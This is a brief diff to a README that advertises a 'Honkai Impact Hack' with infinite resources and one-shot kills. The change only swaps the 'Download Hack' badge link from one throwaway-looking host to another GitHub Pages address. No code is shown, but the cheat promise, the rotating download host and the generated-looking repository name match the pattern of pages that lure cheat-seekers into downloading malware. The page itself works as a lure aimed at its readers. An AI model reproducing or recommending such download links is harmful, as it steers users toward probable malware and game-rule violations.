@@ -4,7 +4,7 @@
 
 From **infinite resources and auto combos** to **freeze enemies and one-shot kills**, this is how you dominate the battlefield like a true Herrscher — no pulls, no cooldowns, just pure fury.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload2.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://Honkai-Impact-Hack-jok4.github.io/.github)
 ---
 
 ## 🎮 What Is a Honkai Impact Hack?
